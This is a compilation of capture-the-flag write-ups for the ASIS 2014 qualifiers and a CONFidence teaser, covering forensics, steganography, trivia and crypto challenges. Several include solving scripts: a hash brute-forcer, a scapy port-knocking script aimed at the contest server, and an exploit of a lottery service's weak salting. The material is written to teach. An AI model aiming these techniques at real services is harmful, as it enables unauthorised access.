# ASIS Cyber Security Contest Quals 2014: Archaic

**Category:** Crypto
**Points:** 300
**Description:**

> [file](crypto_300_5e5d1adf0bb2ca58131ca28878a4b907)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Auth

**Category:** Reverse, PPC
**Points:** 150
**Description:**

> The Server is running at the following address. [file](re_150_36f68dc6c8821f4b8fc80e5f74b56e32)
> 87.107.124.12:25565

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Blocks

**Category:** Crypto, Stego
**Points:** 100
**Description:**

> [stego_100_e62586adf1bcc7de668fa562955c0aa5](file)

## Write-up

(TODO)

## Other write-ups

* <http://hexpresso.wordpress.com/2014/05/10/asis-ctf-quals-2014-stego-100-blocks-write-up/>

# ASIS Cyber Security Contest Quals 2014: Bomb

**Category:** Reverse, PPC
**Points:** 150
**Description:**

> During the Islamic revolution of 1979, a secret file was found that we think it shows the date designated for a future bombing. Find the time for that attempt.
> [file](re_150_94e0cc6ec62cef03578f6db7cf082d96)
> Caution: This program only simulates the bomb trigger.

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Bonus

**Category:** Trivia
**Points:** 75
**Description:**

> There will be bonus points for the teams that submit the most interesting screenshots of working flow, tools and other CTF related stuff to our Email address.
> Maximum 3 pictures
> Make sure you include your team name in the email

# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Easy Reading

**Category:** Stego, Forensic
**Points:** 200
**Description:**

> Read the attached text and find the flag
> [file](stego_200_18c49be05801a16188e1f23e35d4798c)
> No need to calculate MD5 or appending `ASIS_`
>
> Hint: Dashing!

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: ECC

**Category:** Crypto
**Points:** 150
**Description:**

> In the Menezes-Vanstone cryptosystem, we have m2, c1, c2 for a NIST-P-256 elliptic curve.
> [file](crypto_150_165ecb5d4c31280c2ea82c670dfe26e3)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: forensic

**Category:** Forensic
**Points:** 150
**Description:**

> [file](forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3)

## Write-up

Let’s see what [the provided file](forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3) could be:

```bash
$ file forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3
forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3 > forensic_150`
* `unxz < forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3 > forensic_150`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x forensic_150_d0a3ca9740270f3b30e56c9cfa3050f3
```

Let’s find out what the extracted file is:

```bash
$ file forensic_150
forensic_150: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf forensic_150
x forensic_150_2ca7d28df77ec506efc36dd09a146b13
```

And inspect the extracted file:

```bash
$ file forensic_150_2ca7d28df77ec506efc36dd09a146b13
forensic_150_2ca7d28df77ec506efc36dd09a146b13: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

This is a pcap file. Let’s open it in Wireshark and fire up a packet search for the string “flag” in the packet bytes. All results seem to be comments to some HTML/JavaScript code about a boolean variable (a flag) — except for one result, which seems to be the result of a file download called `myfile`. Extracting this file from the pcap and using the Linux `file` command we see that `myfile` is actually another pcap file. However, loading it in Wireshark doesn’t seem to work — the file is broken. We ran `pcapfix` on `myfile` which succesfully repaired it so it could be opened in Wireshark. Investigating this file reveals a file upload to an HP device, most likely a printer. Again, we extract this file which resulted in a PostScript file that contained the flag in ASCII art.

## Other write-ups

* http://blog.squareroots.de/en/2014/05/asis-ctf-2014-forensic/

# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```
>
> Hint: ACL Forensic

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Forensic 2

**Category:** Forensic
**Points:** 300
**Description:**

> [file](https://mega.co.nz/#!fk4iEJRb!hrGOlhPVyaTsskucvhCTBYEIIPIEcBXQqibGbbYPAGk) (`forensic_300_4a6f16218336d046acff450dd5570c02`; 317.4 MB)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Gas stations

**Category:** /
**Points:** 225
**Description:**

> We want to plan the placement of some gas stations, in such a way that cost of traveling between homes and nearest gas station be the least possible amount.
>
> ```bash
> nc 87.107.124.13 9302
> ```

## Write-up

(TODO)

## Other write-ups

* <https://translate.google.com/translate?sl=in&tl=en&hl=en&u=http%3A%2F%2Frentjong-team.blogspot.com%2F2014%2F05%2Fasis-quals-2014-write-up-gas-stations.html>

# ASIS Cyber Security Contest Quals 2014: Hidden flag

**Category:** Web
**Points:** 75
**Description:** (none)

## Write-up

The detail page for this challenge (available only after login) sends the following HTTP headers:

```
Connection: keep-alive
Content-Encoding: gzip
Content-Language: en-us
Content-Type: text/html; charset=utf-8
Date: Sat, 10 May 2014 13:33:37 GMT
Server: nginx
Transfer-Encoding: chunked
Vary: Cookie, Accept-Language
X-Content-Type-Options: nosniff
x-flag: ASIS_b6b?244608c2?c2e869cb56?67b64?b1
X-Frame-Options: SAMEORIGIN
X-Hacker: Don't Be A Jerk
X-Powered-By: ASIS
X-XSS-Protection: 1; mode = block
```

The `x-flag: ASIS_b6b?244608c2?c2e869cb56?67b64?b1` header value looks like a flag, except four hexadecimal digits have been replaced with question marks. We’ll have to find the right combination of digits, but there are 65,536 possibilities (16 possibilities for each of the 4 digits, i.e. 16 to the power of 4). We definitely cannot submit all of these manually…

Luckily, the challenge detail page contains some JavaScript that validates the flag before submitting it to the server:

```js
$('flag_submission').submit(function(e){
  e.preventDefault();
  var shaObj = new jsSHA(document.forms["flag_submission"]["id_flag"].value, "TEXT");
  var hash = shaObj.getHash("SHA-256", "HEX");
  var shaObj2 = new jsSHA(hash, "TEXT");
  var hash2 = shaObj2.getHash("SHA-256", "HEX");
  if (document.forms["flag_submission"]["check"].value !== hash2) {
    if ($("#id_flag").next().length == 0){
      $('<div class="alert alert-danger" id="answer" />').insertAfter('#id_flag');
    }
    // …
  }
  // …
});
```

It looks like the entered flag gets hashed using SHA-256 twice, and is then compared to the `value` of the `<input>` element with `name="check"`. Let’s see what that value is:

```html
<input id="id_check" name="check" type="hidden" value="2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1" />
```

Now that we know `2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1` is equal to `sha256(sha256(flag))`, and that flag is some variation of `ASIS_b6b?244608c2?c2e869cb56?67b64?b1`, we can write a script to brute-force the result. Here’s a quick and dirty solution:

```python
#!/usr/bin/env python
# coding=utf-8

import hashlib
import sys

hex_digits = 'abcdef0123456789'
for a in hex_digits:
  for b in hex_digits:
    for c in hex_digits:
      for d in hex_digits:
        flag = 'ASIS_b6b%s244608c2%sc2e869cb56%s67b64%sb1' % (a, b, c, d)
        flagHash = hashlib.sha256(flag).hexdigest()
        checkHash = hashlib.sha256(flagHash).hexdigest()
        if checkHash == '2b127c77074e44b6e74074b1eb8d32dfe27fe78e6a05e302baed68e2cc643ca1':
          print 'Flag found: %s' % flag
          sys.exit()
```

Let’s run it:

```bash
$ python hidden-flag.py
Flag found: ASIS_b6be244608c27c2e869cb56167b649b1
```

The flag is `ASIS_b6be244608c27c2e869cb56167b649b1`.

## Other write-ups

* http://nickthefrost.com/2014/05/10/asis-ctf-quals-2014-hidden-flag/

# ASIS Cyber Security Contest Quals 2014: Hurdling

**Category:** Web
**Points:** 150
**Description:**

> 87.107.124.20:1050
>
> Hint: Rsync
> traffic problems are intentional

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Image

**Category:** Trivia
**Points:** 50
**Description:**

> Download the attached file and find the flag
> [file](joy_50_25b927e48a23a4b41f215303ca988a01)
> No need to calculate MD5 or appending `ASIS_`.

We are given the file `joy_50_25b927e48a23a4b41f215303ca988a01` without any extensions so the first thing we do is to run `file` command which gives us:

```bash
$ file joy_50_25b927e48a23a4b41f215303ca988a01
joy_50_25b927e48a23a4b41f215303ca988a01: xz compressed data
```

We can decompress it by running the `tar` command with the following arguments:

```bash
$ tar -xv --xz -f joy_50_25b927e48a23a4b41f215303ca988a01
1
x joy_a653520127e5147e0f9cc489ea9d1cf6
```

Running the `file` command again on extracted file gives us

```
joy_a653520127e5147e0f9cc489ea9d1cf6: iNES ROM dump, 1x16k PRG, 1x8k CHR, [Horiz.]
```

So we can rename it to add a proper extension.

```bash
$ mv joy_a653520127e5147e0f9cc489ea9d1cf6 joy_a653520127e5147e0f9cc489ea9d1cf6.nes
```

Look like we need to find ourselves a SNES emulator. There are plenty of those available on the Internet for various OSes. A good place to start for finding tools to play with ROMs is [romhacking.net](http://www.romhacking.net), on Ubuntu though we can install [bsnes](https://apps.ubuntu.com/cat/applications/bsnes/) which is available via Ubuntu Software Center.

After loading the ROM file we are presented with an old game of [Namco](http://en.wikipedia.org/wiki/Namco) - [Tank Battalion](http://en.wikipedia.org/wiki/Tank_Battalion) with some minor tweaks.

![Main Screen of the game](main-screen.png)

By playing a game and going through the first level we are shown with a map for level two.

![Level 2 map](level-2.png)

Thus the flag should be: 8BIT RULES, but it did not work.

Later (2014-05-10 01:31) during the competition the image file was [updated](trivia_50_88da3c57a7b4489036943d35d551cab2). Repeating the steps as described above gives us:

![Level 2 map altered](level-2-updated.png)

The flag is `8BIT_RULES`.

We do not need to play the game to get to second (or in that matter to any) level. On the level selection screen we can press `X` (bind to `A` button on SNES pad) to change level to 2.

## Other write-ups

* http://nickthefrost.com/2014/05/10/asis-ctf-quals-2014-image/

# ASIS Cyber Security Contest Quals 2014: Impenetrable

**Category:** Web
**Points:** 300
**Description:**

> <http://87.107.124.13:1048>
>
> Hint: Try to log in with the username that has numbers in the beginning

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Malware

**Category:** Reverse, PPC
**Points:** 400
**Description:**

> after running this malware, our files changed. find the flag.
> "Caution": The attached file is a malware. DO NOT run it.
> [file](re_400_a60dcaddf7430953d053d9fec5b0c932)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: MESA system

**Category:** Web
**Points:** 150
**Description:**

> Go to <http://87.107.123.4:8023/>

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Milad Tower

**Category:** Crypto, Stego
**Points:** 150
**Description:**

> Download the attached file and find the flag
> [file](stego_150_098e541d820fc7f4aaffefd5cba866ff)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Plough

**Category:** Crypto
**Points:** 250
**Description:**

> Source code of encryptor and encrypted file is given
> [file](crypto_250_bf16a61aa8117be9c994f171023d37ff)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Prying ears

**Category:** Forensic
**Points:** 175
**Description:**

> [file](forensic_175_1f352928fa34c024c9ab15d102b115ce)

## Write-up

Let’s see what [the provided file](forensic_175_1f352928fa34c024c9ab15d102b115ce) could be:

```bash
$ file forensic_175_1f352928fa34c024c9ab15d102b115ce
forensic_175_1f352928fa34c024c9ab15d102b115ce: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < forensic_175_1f352928fa34c024c9ab15d102b115ce > forensic_175`
* `unxz < forensic_175_1f352928fa34c024c9ab15d102b115ce > forensic_175`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x forensic_175_1f352928fa34c024c9ab15d102b115ce
```

Let’s find out what the extracted file is:

```bash
$ file forensic_175
forensic_175: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf forensic_175
x forensic_175_d78a42edc01c9104653776f16813d9e5
```

And inspect the extracted file:

```bash
$ file forensic_175_2ca7d28df77ec506efc36dd09a146b13
forensic_175_d78a42edc01c9104653776f16813d9e5: data
```

The file is a Pcap-ng (Wireshark) file. Running Wireshark’s protocol hierarchy on the file reveals a lot of DNS traffic.
We notice that most of this DNS traffic consists of requests to a domain name with the following format: `[0-9a-f]{14}.asis.io`. However, all of them result in a “not found” response.

Looking closer we see that all of the prefixes to `.asis.io` are hexadecimal digits. The first one is `89504e470d0a1a`, which contains the [magic number](http://en.wikipedia.org/wiki/List_of_file_signatures) for PNG (`89 50 4e 47 0d 0a 1a 0a`). So we extracted all the requests with the `[0-9a-f]{14}.asis.io` format, saved the prefixes to a file and transformed them to a PNG using:

```bash
$ xxd -r -p hex.txt out.png
```

The PNG file contained the flag.

## Other write-ups

* <http://tasteless.se/2014/05/asis2014-forensics-175-prying-ears/>

# ASIS Cyber Security Contest Quals 2014: Random Image

**Category:** Crypto
**Points:** 150
**Description:**

> Find the flag
> [file](crypto_150_8f3fd5d2bacd408904b8406c19183c23)

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

The challenge contains this image:

![](enc.png)

…and a Python script:

```python
#!/usr/bin/env python

import Image
import random

def get_color(x, y, r):
  n = (pow(x, 3) + pow(y, 3)) ^ r
  return (n ^ ((n >> 8) << 8 ))

flag_img = Image.open("flag.png")
im = flag_img.load()
r = random.randint(1, pow(2, 256))
print flag_img.size

enc_img = Image.new(flag_img.mode, flag_img.size)
enpix = enc_img.load()

for x in range(flag_img.size[0]):
  for y in range(flag_img.size[1]):
    t = random.randint(1, pow(2, 256)) % 250
    enpix[x,y] = t


for x in range(flag_img.size[0]):
  for y in range(flag_img.size[1]):
    if im[x,y] < 250 :
      s = get_color(x, y, r)
      enpix[x,y] = s

enc_img.save('enc' + '.png')
```

The script is used to encode an image with the flag, and turns it into the given image.
Pixels with value lower than 250 are overwritten by the value generated by `get_color(x, y, r)`.
This function generates a value based on the pixel location `(x,y)` and 256-bit random value `r`.
In `get_color` we can see that the value is calculated by XORing the sum of the cubes of `x` and `y` with `r`, and then keeping the least significant 8 bits.

We don't have the random key `r`, but we can bruteforce it because only the least significant 8 bits are used.
For the correct version of `r`, `get_color(x,y,r)` will generate a value that is identical to the one in [`enc.png`](enc.png).
Unfortunately, some pixels will contain random information instead (those which have values 250 and higher in the original flag image).

We give each of these 2 cases a different color. Pixels matching their `get_pixel` value will be colored black, the rest is colored white. For each of the 256 possible values of `r`, we generate a ‘decoded’ image. By going through the image, we find that [`decoded_38.png`](decoded_38.png) (for `r = 38`) contains the flag:

![](decoded_38.png)

[`color_decrypto.py`](color_decrypto.py) contains the code for the solution.

## Other write-ups

* http://blog.squareroots.de/en/2014/05/asis-ctf-2014-color-crypto/

# ASIS Cyber Security Contest Quals 2014

* [Main website](http://asis-ctf.ir/)
* [Scoreboard](http://asis-ctf.ir/scoreboard/)
* [@asisctf on Twitter](https://twitter.com/asisctf)

## Completed write-ups

* [forensic](forensic)
* [Hidden flag](hidden-flag)
* [Image](image)
* [prying ears](prying-ears)
* [Random Image](random-image)
* [Sound Zoo](sound-zoo)
* [Trivia 1](trivia-1)
* [Trivia 2](trivia-2)
* [Undistorted History](undistorted-history)
* [White noise](white-noise)
* [Winner](winner)

## Incomplete write-ups

* [Archaic](archaic)
* [Auth](auth)
* [Blocks](blocks)
* [Bomb](bomb)
* [Bonus](bonus)
* [Censored array](censored-array)
* [Easy Reading](easy-reading)
* [ECC](ecc)
* [Forensic 100](forensic-100)
* [Forensic 2](forensic-2)
* [Gas stations](gas-stations)
* [Hurdling](hurdling)
* [Impenetrable](impenetrable)
* [Malware](malware)
* [MESA system](mesa-system)
* [Milad Tower](milad-tower)
* [Plough](plough)
* [Serial number](serial-number)
* [Spy Paper](spy-paper)
* [Strange](strange)
* [Teleport](teleport)
* [Toq-Toq](toq-toq)
* [Tortureous sound](tortureous-sound)
* [weak password](weak-password)

# ASIS Cyber Security Contest Quals 2014: Serial number

**Category:** Reverse
**Points:** 300
**Description:**

> [file](re_300_75df11d547b3419c0da22b626b7e560e)

## Write-up

(TODO)

## Other write-ups

* <http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup/>

# ASIS Cyber Security Contest Quals 2014: Sound Zoo

**Category:** Stego
**Points:** 150
**Description:**

> [file](steg_150_e3cdf499ed8341fe750530b93b6ff816)

## Write-up

Let’s see what [the provided file](steg_150_e3cdf499ed8341fe750530b93b6ff816) could be:

```bash
$ file steg_150_e3cdf499ed8341fe750530b93b6ff816
steg_150_e3cdf499ed8341fe750530b93b6ff816: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < steg_150_e3cdf499ed8341fe750530b93b6ff816 > stego_150`
* `unxz < steg_150_e3cdf499ed8341fe750530b93b6ff816 > stego_150`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x steg_150_e3cdf499ed8341fe750530b93b6ff816
```

Let’s find out what the extracted file is:

```bash
$ file stego_150
stego_150: POSIX tar archive
```

Extract the tar archive:

```bash
$ tar -vxzf stego_150
x steg_150_ccf8db5e8cf287469ed291212577f032
```

And inspect the extracted file:

```bash
$ file steg_150_ccf8db5e8cf287469ed291212577f032
steg_150_ccf8db5e8cf287469ed291212577f032: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, JntStereo
```

Okay, so it’s an MP3 file that seems to contain a series of engine sounds followed by a computer voice. The computer voice seems to be slowed down though. Open the file in Audacity, go to Effect → Tempo and increase the tempo to 1100% to hear the computer voice reading a code:

```
bbe60b482d22ea98a4d0ef205f772a8b
```

Since the CTF rules state that each flag is of the format `ASIS_x` where `x` is an MD5 hash unless explicitly stated otherwise, the flag is `ASIS_bbe60b482d22ea98a4d0ef205f772a8b`.

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Spy Paper

**Category:** Stego, Forensic
**Points:** 100
**Description:**

> Download the attached file.
> Calculate MD5 of the result and append it after `ASIS_`.
> [file](stego_100_7181a9caf2a2aff628ae86b2e9ccb22b)

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Toq-Toq

**Category:** Forensic
**Points:** 100
**Description:**

> [file](forensic_100_c920dfa687ed1bf550783407025586f1)

## Write-up

[The provided file](forensic_100_c920dfa687ed1bf550783407025586f1) contains a pcap file. After a quick packet search with Wireshark for the string `flag` in the packet bytes we found some directory listings of a web server, each serving a part of the flag. Here’s all of them:

```html
<li><a href="first_part_of_flag">first_part_of_flag</a>
<li><a href="second_part_of_flag">second_part_of_flag</a>
<li><a href="third_part_of_flag">third_part_of_flag</a>
<li><a href="fourth_part_of_flag">fourth_part_of_flag</a>
<li><a href="last_part_of_flag">last_part_of_flag</a>
```

Sadly, navigating to these pages with a web browser results in a timeout.

Then we thought the “toq toq” challenge name might be a wordplay on “knock knock”, so [port knocking](http://en.wikipedia.org/wiki/Port_knocking) might be needed to open the ports to the webservers.

Using the Wireshark filter `ip.dst==87.107.123.4` a pattern emerges. Right before the webserver is contacted for each request, multiple SYN packets are sent to different ports. Feeding these port sequences to a port knocking script indeed opens the ports which allows us to capture the flag.

Here’s the script we used:

```python
#!/usr/bin/python
# modified version of Eindbazen’s port knocking script

from scapy.all import *
import urllib2

host = "87.107.123.4"

def doPortKnocking(ports, weburl):
  conf.verb = 0
  for dport in range(0, len(ports)):
    #print "[*] Knocking on "+host+": " , ports[dport]
    ip = IP(dst=host)
    port = 39367
    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
    send(SYN)
  response = urllib2.urlopen(weburl)
  html = response.read()
  print html
  response.close() # best practice to close the file

ports = [9264, 11780, 2059, 8334]
print "First part:"
doPortKnocking(ports, 'http://87.107.123.4:24931/first_part_of_flag')

ports = [42304, 53768, 3297, 8334]
print "Second part:"
doPortKnocking(ports, 'http://87.107.123.4:19760/second_part_of_flag')

ports = [23106, 4250, 62532, 11655, 33844]
print "Third part:"
doPortKnocking(ports, 'http://87.107.123.4:3695/third_part_of_flag')

ports = [49377, 48116, 54900, 8149]
print "Fourth part:"
doPortKnocking(ports, 'http://87.107.123.4:31054/fourth_part_of_flag')

ports = [16340, 59991, 37429, 60012, 15397, 21864, 12923, 8799]
print "Last part:"
doPortKnocking(ports, 'http://87.107.123.4:8799/last_part_of_flag')
```

## Other write-ups

* <http://blog.dul.ac/2014/05/ASISCTF14/>

# ASIS Cyber Security Contest Quals 2014: Tortureous sound

**Category:** Trivia, Stego
**Points:** 75
**Description:**

> Listen to the attached file and find the flag
> [file](stego_75_5ecb5b98aa04033a9855416daed603c8)

## Write-up

Let’s see what [the provided file](stego_75_5ecb5b98aa04033a9855416daed603c8) could be:

```bash
$ file stego_75_5ecb5b98aa04033a9855416daed603c8
stego_75_5ecb5b98aa04033a9855416daed603c8: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < stego_75_5ecb5b98aa04033a9855416daed603c8 > stego_75`
* `unxz < stego_75_5ecb5b98aa04033a9855416daed603c8 > stego_75`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x stego_75_5ecb5b98aa04033a9855416daed603c8
```

Let’s find out what the extracted file is:

```bash
$ file stego_75
stego_75: POSIX tar archive (GNU)
```

Okay, let’s extract the tar archive:

```bash
$ tar -xvf stego_75
x stego_75_111cbfefb1af0175b73d8800ba187ebc
```

…and figure out what the extracted file is:

```bash
$ file stego_75_111cbfefb1af0175b73d8800ba187ebc
stego_75_111cbfefb1af0175b73d8800ba187ebc: ISO Media, MPEG v4 system, version 2
```

Opening the file in Audacity reveals that it is indeed an audio file with 6 channels.

(TODO)

## Other write-ups

* http://blog.squareroots.de/en/2014/05/asis-ctf-2014-tortureous-sound/

# ASIS Cyber Security Contest Quals 2014: Trivia 1

**Category:** Trivia
**Points:** 10
**Description:**

> Then he said: Thou shalt not send packets, that do not conform to the specification, yet thou shalt accept them, if you can understand their meaning.
> Do not calculate MD5 or add `ASIS_`

## Write-up

This sounds like [the robustness principle](http://en.wikipedia.org/wiki/Robustness_principle), also known as Postel’s law.

The flag is `Postel's law`.

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Trivia 2

**Category:** Trivia
**Points:** 60
**Description:**

> Downtime caused to a website by massive referrals from another popular site.
> Do not calculate MD5 or add `ASIS_`.

## Write-up

The flag is [`Slashdot effect`](http://en.wikipedia.org/wiki/Slashdot_effect).

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Undistorted History

**Category:** Trivia
**Points:** 1
**Description:**

> What is the name of this place?
> No need to calculate MD5 or appending `ASIS_`.

## Write-up

Checking the location on the map view ![Image](undistorted_history.png) revealed that the Challenge was located at the Persian Gulf.

The flag is `Persian Gulf`.

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: weak password

**Category:** Web
**Points:** 150
**Description:**

> <https://87.107.124.21:1443>

## Write-up

(TODO)

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: White noise

**Category:** Stego
**Points:** 175
**Description:**

> [file](steg_250_8be7a320b7cbc2696f352cb42e717a0b)

## Write-up

The file seems to be a `tar.xz` container (`file steg_250_8be7a320b7cbc2696f352cb42e717a0b`). So we use `tar -xf steg_250_8be7a320b7cbc2696f352cb42e717a0b`.

The extracted file seems to be a PNG – just a random noise picture. Using `pnginfo` tells us this:

```bash
$ pnginfo steg_250_958a0ad74c8f0e07adb6c92672490b72
Image Width: 256 Image Length: 256
Bitdepth (Bits/Sample): 8
Channels (Samples/Pixel): 3
Pixel depth (Pixel Depth): 24
Colour Type (Photometric Interpretation): RGB
Image filter: Single row per byte filter
Interlacing: No interlacing
Compression Scheme: Deflate method 8, 32k window
Resolution: 0, 0 (unit unknown)
FillOrder: msb-to-lsb
Byte Order: Network (Big Endian)
Number of text strings: 0 of 0
```

Nothing useful. Let’s start looking at the RGB values of each pixel using a Python script:

```python
from PIL import Image

im = Image.open("foto.png")
rgb_im = im.convert('RGB')
#size is 256 by 256
for x in xrange(0,255):
  for y in xrange(0,255):
    r, g, b = rgb_im.getpixel((x, y))
    print str(r) + " " + str(g) + " " + str(b)
```

The output is:

```
R   G   B
128 80 239
128 171 83
128 165 100
128 136 219
128 165 161
128 68 224
128 119 60
…
```

All the `R`’s are 128, so probably not important. Let’s export all the `G`’s and `B`’s only, like this:

```python
from PIL import Image

im = Image.open("foto.png")
rgb_im = im.convert('RGB')
#size is 256 by 256
for x in xrange(0,255):
  for  y in xrange(0,255):

    r, g, b = rgb_im.getpixel((x, y))
    print "(" str(g) + ";" + str(b) + ")"
```

…it gives us this kind of output:

```
(80;239)
(171;83)
(165;100)
(136;219)
(165;161)
(68;224)
(119;60)
(171;162)
…
```

When using the first 10000 points as coordinates on a scatter-plot (I used Excel 2013 to do this), the following becomes visible:

![](flag.png)

When rotating this picture the flag becomes visible: `ASIS_329afbd5ba6fc8b1df15e886edbdcc25`.

Only 4 teams managed to solve this challenge.

## Other write-ups

* none yet

# ASIS Cyber Security Contest Quals 2014: Winner

**Category:** Trivia
**Points:** 20
**Description:**

> cheetah...lane...tangle
> Who won it?
> No need for MD5 or `ASIS_`

## Write-up

After looking for those words and 'win' in Google we came up with Wikipedia page (this is the only one that is connected with IT/Security) about [NIST hash function competition](http://en.wikipedia.org/wiki/NIST_hash_function_competition).
The purpose of this cometition was to develop a [SHA-3](http://en.wikipedia.org/wiki/SHA-3) to complement SHA-1 and SHA-2 hashing algorithms.

Cheetah, Lane and Tangle were all entrants to the competition though they did not qualify for the final round. The winner was [Keccak](http://en.wikipedia.org/wiki/Keccak) thus the flag for this challenge is Keccak.

## Other write-ups

* none yet

# CONFidence DS CTF Teaser: Crypto100

**Category:** Crypto
**Points:** 100
**Description:**

> We’ve created a lotto system. Shall we play a game?
>
> ```bash
> nc 23.253.207.179 10001
> ```
> Use the [source](lotto.py)

## Write-up

The lottery is [a Python script](lotto.py) that uses [pycrypto](https://pypi.python.org/pypi/pycrypto/2.6.1), so run `easy_install pycrypto` if you want to run it locally.

Let’s connect to the online service and see how it works:

```bash
$ nc 23.253.207.179 10001
###############################################################################
#                                                                             #
# Welcome to our Lotto!                                                       #
# Bid for $5, win $100!                                                       #
# Our system is provably fair:                                                #
#    Before each bid you'll receive encrypted result                          #
#    After the whole game we will reveal the key to you                       #
#    Then, you can decrypt results and verify that we haven't cheated on you! #
#     (e.g. by drawing based on your input)                                   #
#                                                                             #
###############################################################################

Your money: $100
Round verification: 18167373f0918114f833cdbc184202bf

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
1
Your guess (0-1000): 42
You lost!
The lucky number was: 182
[enter] to continue...

Your money: $95
Round verification: 30b15b44ce3cbfb2b936538c36e41bc5

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
2
You cannot withdraw your money until you get $1337!
The lucky number was: 292
[enter] to continue...

Your money: $95
Round verification: 1e3f942dfd3f5718789e14ebf570eae7

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
3
The lucky number was: 342
Verification key: 5e230c5a1f2b766309ec28bf2eff01d8
```

Cross-referencing this with the source code, it becomes clear there these are the three options for each round:

1. Bet $5. If you guess [the number from `0` to `1000`](lotto.py#L57) correctly, you win $100 (i.e. a profit of $95).
2. Withdraw your money. This [displays the flag if you have $1337 or more, and fails otherwise](lotto.py#L85-89). Either way it also [reveals the lucky number](lotto.py#L96) that you were supposed to guess.
3. Quit the game.

Looking more closely, we learn that the lottery uses the same AES encryption key for each round in the same connection/session:

```py
key = Random.new().read(16) # slow, but secure
aes = AES.new(key, AES.MODE_ECB)
```

However, each lucky number is concatenated with a random salt before it’s encrypted into the so-called “round verification hash”:

```
salted = str(luckyNumber) + '#'
salted = randomExtend(salted)
```

For example, if `luckyNumber` is `84`, then `randomExtend(str(luckyNumber) + '#')` is something like `84#00059d2a12d51`. After patching `lotto.py` to log the salted lucky number for each round, it became clear that all salts started with two zeroes:

```
247#000000000000
84#00059d2a12d51
255#00beca8fe000
364#00ddf93a9d91
538#00552d9ca771
743#003fbc1cb5c9
…
```

Yep, that first one even has only zeroes! This seemed to happen quite commonly; about 10% of all salts ended in `000000000000`. Looks like `randomExtend` isn’t as random as it should be :) (Explanation: any number with a `0` as the last digit (i.e. 10% of numbers) [raised to a high power](lotto.py#L30-38) will have a bunch of zeroes at the end.)

This flaw enables us to write a fairly simple brute-force solution with the following algorithm:

1. Connect to the lottery service.
2. For each round, make a note of the round verification hash. If the round verification hash has been used before, bet $5 on the lucky number it mapped to before; this gets you $95. If not, choose “Withdraw your money”, which shows you the lucky number for this round — remember that the given round verification hash mapped to this lucky number.
3. If you keep repeating this long enough, at some point you’ll have $1430. Now you can choose “Withdraw your money” to get the flag.

[`brute-force-solution.py`](brute-force-solution.py) is a Python implementation of this solution. It took the script about 25 minutes to make enough money to get the flag:

```bash
$ python brute-force-solution.py
Round #1 | Money: $100 | Round verification: 496be14c66a5aac6af1fd841f26102f4
Lucky number: 229
